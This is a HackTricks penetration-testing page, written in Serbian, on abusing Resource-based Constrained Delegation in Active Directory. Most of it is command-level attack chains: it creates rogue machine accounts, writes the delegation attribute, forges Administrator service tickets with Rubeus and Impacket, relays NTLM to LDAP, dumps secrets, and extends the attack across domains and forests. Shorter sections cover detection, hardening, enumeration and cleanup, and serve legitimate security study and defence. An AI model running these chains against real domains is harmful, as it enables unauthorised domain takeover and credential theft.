# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Osnove Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) sličan je [constrained delegation](constrained-delegation.md), ali je smer poverenja obrnut. Kod tradicionalne constrained delegation beleži se kojim servisima principal može da delegira; kod RBCD se na **ciljnom resursu** beleži koji principali mogu da se predstavljaju kao korisnici pri pristupu tom resursu.<sup>[[12]](#references)</sup>

Atribut _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ ciljnog objekta sadrži bezbednosni deskriptor koji identifikuje principale kojima je dozvoljeno da deluju u ime drugih identiteta na tom resursu.

Još jedna važna razlika je u tome što principal sa dovoljnim **dozvolama za pisanje nad računom računara** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` i sličnim pravima) možda može da postavi _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Za konfigurisanje tradicionalne constrained delegation obično je potreban privilegovaniji administrativni pristup.<sup>[[1]](#references)</sup>

Preciznije, izmena postavki klasične constrained delegation obično je uslovljena pravom `SeEnableDelegationPrivilege` na kontroleru domena, koje najčešće imaju samo administratori sa visokim privilegijama. RBCD prebacuje odluku na bezbednosni deskriptor ciljnog objekta, pa pristup za pisanje nad relevantnim svojstvom objekta računara može biti dovoljan, bez tog korisničkog prava.<sup>[[1]](#references)[[2]](#references)</sup>

### Novi koncepti

Zastavica **`TrustedToAuthForDelegation`** u `userAccountControl` često se opisuje kao preduslov za **S4U2Self**, ali to nije sasvim tačno.\
Service principal sa SPN-om može da zatraži S4U2Self i bez te zastavice. Kada je postavljena zastavica `TrustedToAuthForDelegation`, vraćena service ticket je **forwardable**; bez nje je ticket obično **non-forwardable**.<sup>[[5]](#references)</sup>

Traditional constrained delegation odbacuje **non-forwardable TGS** u koraku S4U2Proxy. RBCD može da prihvati tu S4U2Self ticket ako bezbednosni deskriptor cilja dozvoljava servis koji podnosi zahtev.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Struktura napada

> Ako imate **privilegije ekvivalentne dozvoli za pisanje** nad **računom računara**, možda ćete moći da ostvarite privilegovan pristup toj mašini.

Pretpostavimo da napadač već ima **privilegije ekvivalentne dozvoli za pisanje nad objektom računara žrtve**.

1. Napadač **kompromituje** nalog sa **SPN-om** ili ga **kreira** („Service A“). Podrazumevano, autentifikovani korisnik domena može da kreira najviše 10 objekata računara, u skladu sa postavkom **_MachineAccountQuota_**; objekat računara automatski obezbeđuje upotrebljive SPN-ove.
2. Napadač **zloupotrebljava svoju WRITE privilegiju** nad računarom žrtve (ServiceB) da bi konfigurisao **resource-based constrained delegation tako da ServiceA može da se predstavlja kao bilo koji korisnik** u odnosu na taj računar žrtve (ServiceB).
3. Napadač koristi Rubeus da izvrši **potpuni S4U napad** (S4U2Self i S4U2Proxy) sa Service A na Service B za korisnika **koji ima privilegovan pristup Service B**.
   1. S4U2Self (sa kompromitovanog ili kreiranog naloga sa SPN-om): zatražiti **TGS koji predstavlja Administratora za Service A** (non-forwardable).
   2. S4U2Proxy: upotrebiti taj **non-forwardable TGS** za zahtev za service ticket koja predstavlja **Administratora** na **računaru žrtve**.
   3. Non-forwardable ticket i dalje može da funkcioniše u ovom RBCD toku jer je Service A ovlašćen u bezbednosnom deskriptoru ciljnog resursa.
4. Napadač može da izvrši **pass-the-ticket** i **da se predstavlja kao** korisnik kako bi ostvario **pristup računaru žrtve ServiceB**.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` onemogućava podrazumevani način kreiranja računara, ali ne uklanja dozvole za pisanje nad ciljnim objektom računara niti kontrolu nad postojećim nalogom. Kontrolisani običan korisnik bez SPN-a ponekad se može koristiti kao principal koji delegira putem [SPN-less U2U method](#spn-less-cross-domain--cross-forest-rbcd), uključujući i slučaj kada se sve odvija unutar jednog domena. Za taj način su i dalje potrebni efektivno pravo za pisanje RBCD, kontrola nad akreditivima korisnika koji delegira, identitet koji može biti delegiran, kompatibilno ponašanje Kerberos enkripcije i promena NT hash-a koja ometa nalog. Tretirajte ih kao odvojene preduslove; prazan RBCD atribut ili nulta kvota sami po sebi ne dokazuju ni uspeh ni bezbednost.

Postojeći RBCD deskriptor može da navodi i **grupu**, a ne direktno računar koji delegira. Ako kontrolišete nalog računara sa SPN-om i možete da ga dodate u tu grupu, novo članstvo može da omogući put za delegaciju bez izmene RBCD atributa ciljnog računara. Pre zaključka da li taj put funkcioniše, proverite efektivnu ACL za upisivanje članova grupe (uključujući deny ACE-ove), ugnježdeno članstvo i osvežavanje tokena, SID trustee-a u deskriptoru, ograničenja delegacije za nalog koji se impersonira i SPN ciljnog servisa.

Da biste proverili _**MachineAccountQuota**_ domena, možete koristiti:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Napad

### Kreiranje računarskog objekta

Možete kreirati računarski objekat unutar domena pomoću **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Konfigurisanje delegiranja ograničenog na osnovu resursa

**Korišćenjem PowerShell modula za Active Directory**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Korišćenje powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Izvođenje potpunog S4U attack-a (Windows/Rubeus)

Najpre smo kreirali novi Computer objekat sa lozinkom `123456`, pa nam je potreban hash te lozinke:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Ovo će prikazati RC4 i AES hash vrednosti za taj nalog.\
Sada se napad može izvršiti:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Možete generisati više tiketa za više servisa jednim zahtevom, koristeći parametar `/altservice` u alatu Rubeus:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Korisnici mogu biti označeni kao **„Nalog je osetljiv i ne može mu se delegirati.“** Ako je ova zastavica omogućena, nalog se ne može impersonirati kroz ovaj tok delegiranja. BloodHound prikazuje ovo svojstvo tokom analize.

### Linux alati: RBCD lanac od početka do kraja uz Impacket (2024+)

Ako radite iz Linuxa, možete izvršiti ceo RBCD lanac pomoću zvaničnih Impacket alata:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Beleške
- Ako je LDAP signing/LDAPS obavezan, koristite `impacket-rbcd -use-ldaps ...`.
- Dajte prednost AES ključevima; mnogi savremeni domeni ograničavaju RC4. Impacket i Rubeus podržavaju tokove koji koriste samo AES.
- Impacket može da prepiše `sname` („AnySPN“) za neke alate, ali kad god je moguće, pribavite ispravan SPN (npr. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD između domena i šuma

Ako se **delegirajući principal** kojim upravljate nalazi u **drugom domenu** (ili čak u **drugom šumu**) u odnosu na **računar resursa**, zloupotreba i dalje predstavlja **RBCD**, ali tok tiketa više nije uobičajeni `S4U2Self -> S4U2Proxy` unutar jednog domena.

### RBCD između domena: konfigurisanje stranog principala pomoću SID-a

Kada podešavate `msDS-AllowedToActOnBehalfOfOtherIdentity` iz **drugog domena**, strani računar/korisnik možda **neće moći da se razreši po imenu** u LDAP-u ciljnog domena. U tom slučaju podesite unos delegiranja pomoću **SID-a** stranog principala umesto njegovog sAMAccountName/UPN-a.

Ovo je posebno važno prilikom relay-a NTLM-а ka LDAP-u pomoću `ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Napomene:
- `--sid` govori alatu `ntlmrelayx.py` da tretira `--escalate-user` kao SID, što je neophodno kada delegirajući nalog pripada drugom domenu.
- Čak i ako alat prikaže `User not found in LDAP`, upis delegiranja i dalje može uspeti jer se strani SID direktno čuva u security descriptor-u.

### RBCD između domena: S4U sekvenca između realm-ova

Kada se strani principal nađe u `msDS-AllowedToActOnBehalfOfOtherIdentity`, funkcionalni tok između domena je sledeći:<sup>[[9]](#references)[[13]](#references)</sup>

1. Preuzmite **TGT** za delegirajući principal iz njegovog domena.
2. Zatražite **referral TGT** za `krbtgt/<target-domain>`.
3. Zatražite **cross-realm S4U2Self referral** za korisnika koji se impersonira na DC-u ciljnog domena.
4. Zatražite stvarni **S4U2Self** ticket za tog korisnika nazad u domenu delegirajućeg principala.
5. Obavite **S4U2Proxy** u domenu delegirajućeg principala da biste dobili referral ticket za ciljni domen.
6. Obavite završni **S4U2Proxy** na DC-u ciljnog domena da biste dobili service ticket za `cifs/host.target`, `host/host.target` itd.

Zbog toga standardni Linux alati često ne uspevaju kod RBCD-a između domena:<sup>[[9]](#references)</sup>
- **realm** zahteva možda mora da se razlikuje od realm-a TGT-a korišćenog u `TGS-REQ`
- lanac zahteva **nezavisne S4U2Proxy korake**, a ne samo `S4U2Self` ili `S4U2Self` praćen jednim `S4U2Proxy`

### RBCD između domena iz Linuxa

Synacktiv je objavio implementaciju Impacket-ovog `getST.py` koja ponavlja sekvencu između realm-ova iz Linuxa tako što eksplicitno obrađuje oba KDC-a:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Operativno, novi argumenti su:
- `-dc-ip`: DC delegirajućeg domena
- `-targetdomain`: domen računara-resursa
- `-targetdc`: DC domena resursa

### Ograničenja RBCD-a između šuma

RBCD između šuma ima važno ograničenje: **impersonifikovani korisnik mora da pripada istoj šumi kao i delegirajući principal**. Drugim rečima, ako je nalog računara pod vašom kontrolom u `valhalla.local`, a ciljni resurs u `asgard.local`, uglavnom **ne možete da impersonifikujete proizvoljne korisnike iz `asgard.local` na tom resursu putem RBCD-a**.<sup>[[9]](#references)</sup>

I dalje se može iskoristiti kada:
- je korisnik iz **delegirajuće šume** **local admin** (ili na drugi način ima povišene privilegije) na hostu resursa u drugoj šumi
- trust omogućava neophodan put za autentifikaciju, a SID iz druge šume je prihvaćen u bezbednosnom deskriptoru ciljnog računara

### Specifičnosti protokola RBCD-a između šuma

RBCD između šuma nije samo „između domena uz trust“. Uočeni tok obuhvata dve specifičnosti koje uobičajeni alati ranije nisu uzimali u obzir:<sup>[[9]](#references)</sup>

1. Dodatni zahtev **S4U2Proxy** koji postavlja **`PA-PAC-OPTIONS=branch-aware`**
2. Završna servisna karta koja može biti vraćena korišćenjem **RC4**, čak i kada su zatraženi drugi tipovi šifrovanja

Praktičan tok je:

1. Dobavite TGT za delegirajući principal u šumi A.
2. Zatražite **S4U2Self** za impersonifikovanog korisnika u šumi A.
3. Zatražite **S4U2Proxy** u šumi A da biste dobili referral TGT za šumu B.
4. Pošaljite drugi zahtev **S4U2Proxy** u šumi A **bez karte S4U2Self kao dodatne karte**, ali sa uključenim `branch-aware`, da biste dobili još jedan referral TGT za šumu B.
5. Po želji, zatražite uobičajenu servisnu kartu u šumi B za delegirajući principal (ova karta nije neophodna za završnu zloupotrebu).
6. Upotrebite referral karte iz koraka 3 i 4 da biste zatražili završnu kartu **S4U2Proxy** u šumi B za korisnika iz šume A koji se impersonifikuje, prema ciljnom SPN-u.

### RBCD između šuma iz Linuxa

Ista grana Synacktiv Impacket-a dodaje prekidač `-forest` za ovu logiku:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### Rekurzivni RBCD u više domena (3+ domena)

U **šumama sa više domena**, i **S4U2Self** i **S4U2Proxy** mogu biti **rekurzivni**, umesto da se zaustave nakon jednog preusmeravanja:

- **Rekurzivni S4U2Self**: prvi `S4U2Self` šalje se u **domen korisnika koji se impersonira**, prolazi se kroz posredne nadređene/podređene hopove pomoću uobičajenih `TGS-REQ` preusmeravanja za `krbtgt/<REALM>`, a **poslednji `S4U2Self`** šalje se u **sopstvenom domenu delegirajućeg principala**.
- To znači da **samo posedovanje TGT-a** za nalog računara može biti dovoljno za impersoniranje **administratora iz drugog domena u istoj šumi** i zahtevanje `cifs/host`, `host/host`, `wsman/host` itd.
- **Rekurzivni S4U2Proxy** prati lanac poverenja na isti način: posredni hopovi ponovo koriste prethodnu kartu kao TGT dok zahtevaju sledeće `krbtgt/<REALM>` preusmeravanje, a samo poslednji hop vraća konačnu servisnu kartu.<sup>[[10]](#references)</sup>

Praktičan primer u istoj šumi je:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### RBCD bez SPN-a između domena / šuma

Ako je **delegirajući principal korisnik bez SPN-a**, poslednji rekurzivni `S4U2Self` ne uspeva uz grešku **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Rešenje je da se **ponovi samo poslednji korak kao `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Ukratko, lanac zloupotrebe:

1. Autentifikujte se pomoću **NT hash-a** kako biste naveli KDC da koristi **RC4-HMAC (etype 23)**.
2. Najpre zatražite **`-self -u2u`** i sačuvajte ovu kartu odvojeno od kasnijeg proxy koraka.
3. Izdvojite **ključ sesije TGT-a** pomoću `describeTicket.py`.
4. Zamenite korisnikov **NT hash** tim **ključem sesije** pomoću `changepasswd.py -newhashes <session_key>`.
5. Ponovo upotrebite kartu `S4U2Self+U2U` kao **`-additional-ticket`** tokom zasebnog zahteva **`-proxy`**.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Operativne napomene:

- Kada je **prvi pouzdani hop već druga forest**, prednost dajte **branch-aware** algoritmu (`getST.py ... -forest`) da biste se ponašali kao izvorni Windows. Ako se do strane forest stigne tek **kasnije** u lancu, nerekurzivni tok koji nije branch-aware i dalje može da funkcioniše.<sup>[[9]](#references)</sup>
- Na novijim **Windows Server 2022/2025** DC-ovima, forsirani RC4 može da ne uspe uz **`KDC_ERR_ETYPE_NOSUPP`** zbog zastarevanja RC4; zbog toga **RBCD bez SPN-a može biti nemoguć**, iako klasični RBCD zasnovan na SPN-u i dalje radi uz AES.<sup>[[15]](#references)</sup>
- Pokrenite **`S4U2Self+U2U` pre promene korisnikovog hash-a/lozinke**: `SamrChangePasswordUser` **ne preračunava Kerberos AES ključeve naloga**, pa promena lozinke pre toga može da pokvari kasnije zahteve za tikete.<sup>[[14]](#references)</sup>
- Imitirani nalog i dalje mora da bude **delegabilan**: **Protected Users** i nalozi sa **`NOT_DELEGATED`** / **„Account is sensitive and cannot be delegated“** blokiraju lanac.

## Napomene o detekciji / ojačavanju bezbednosti

- RBCD putanje između domena/forest-a i dalje se obično uspostavljaju zloupotrebom **ACL-ova** ili putem **relay-to-LDAP**. Sprovedite **LDAP signing** i **LDAP channel binding** na DC-ovima da biste onemogućili uobičajene načine uspostavljanja.
- Proverite ko može da upisuje `msDS-AllowedToActOnBehalfOfOtherIdentity` na computer objektima i razrešite sačuvane SID-ove, uključujući **foreign security principals**.
- U okruženjima sa mnogo trust-ova proverite **Selective Authentication**, **SID filtering** i da li korisnici iz strane forest imaju prava **local admin** na hostovima resursa.

### Pristupanje

Poslednja komandna linija će izvršiti **celokupan S4U napad i ubaciti TGS** od Administratora ka žrtvinom hostu u **memoriju**.\
U ovom primeru je zatražen TGS za uslugu **CIFS** od Administratora, tako da ćete moći da pristupite **C$**:

```bash
ls \\victim.domain.local\C$
```

### Zloupotreba različitih servisnih tiketa

Saznajte više o [**dostupnim servisnim tiketima ovde**](silver-ticket.md#available-services).

## Enumeracija, revizija i čišćenje

### Enumeracija računara sa konfigurisanom opcijom RBCD

PowerShell (dekodiranje SD-a radi razrešavanja SID-ova):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (pročitajte ili ispraznite jednom komandom):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Čišćenje / resetovanje RBCD

- PowerShell (brisanje atributa):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Kerberos greške

- **`KDC_ERR_ETYPE_NOTSUPP`**: To znači da je Kerberos konfigurisan tako da ne koristi DES ni RC4, a prosleđujete samo RC4 hash. Prosledite Rubeus-u bar AES256 hash (ili mu prosledite RC4, AES128 i AES256 hashove). Primer: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** tokom `-self` za običnog korisnika: delegirajući principal verovatno **nema SPN**. Ponovite **poslednji hop** koristeći **`S4U2Self+U2U`** umesto običnog `S4U2Self`.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** tokom **SPN-less RBCD**: noviji DC-ovi mogu da odbiju forsirani **RC4-HMAC** put koji zahteva trik `S4U2Self+U2U` + zamena session key-a. Umesto toga pokušajte klasični **SPN-backed** RBCD put sa AES-om.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: To znači da se vreme na trenutnom računaru razlikuje od vremena na DC-u i da Kerberos ne radi ispravno.
- **`preauth_failed`**: To znači da navedeno korisničko ime i hashovi ne rade za prijavu. Možno je da ste zaboravili da dodate "$" korisničkom imenu prilikom generisanja hashova (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: To може да значи:
  - Korisnik kog pokušavate da imitirate ne može da pristupi željenoj usluzi (jer ne možete da ga imitirate ili nema dovoljno privilegija)
  - Tražena usluga ne postoji (ako tražite ticket za winrm, a winrm nije pokrenut)
  - Kreirani fakecomputer je izgubio privilegije nad ranjivim serverom i morate ponovo da mu ih dodelite.
  - Zloupotrebljavate klasični KCD; imajte na umu da RBCD radi sa ne-forwardable S4U2Self ticketima, dok KCD zahteva forwardable.

## Napomene, relay-i i alternative

- RBCD SD možete upisati i preko AD Web Services (ADWS) ako je LDAP filtriran. Pogledajte:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay lanci se često završavaju RBCD-om kako bi se lokalni SYSTEM dobio u jednom koraku. Pogledajte praktične primere od početka do kraja:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Ako su LDAP signing/channel binding **onemogućeni** i možete da kreirate nalog računara, alati poput **KrbRelayUp** mogu da relay-uju prisiljenu Kerberos autentifikaciju ka LDAP-u, podese `msDS-AllowedToActOnBehalfOfOtherIdentity` za vaš nalog računara na objektu ciljnog računara i odmah imitiraju **Administrator** preko S4U-a sa računara koji nije deo domena.<sup>[[8]](#references)</sup>

## References

- [1] [Mašenje repom: zloupotreba Resource-Based Constrained Delegation za napad na Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Još nešto o delegiranju – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: preuzimanje objekta računara](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – zloupotreba Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity je srušio domen: pregled ofanzivnog Kerberosa](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (zvanični)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Kratka Linux podsetnica sa novijom sintaksom](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing isključen → Kerberos relay ka RBCD-u)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - istraživanje RBCD-a između domena i šuma](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - istraživanje RBCD-a između domena i šuma: drugi deo](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket grana - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - pregled Kerberos constrained delegation-a](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - S4U2Self između domena](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - otkrivanje i otklanjanje upotrebe RC4 u Kerberosu](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – detalji o S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
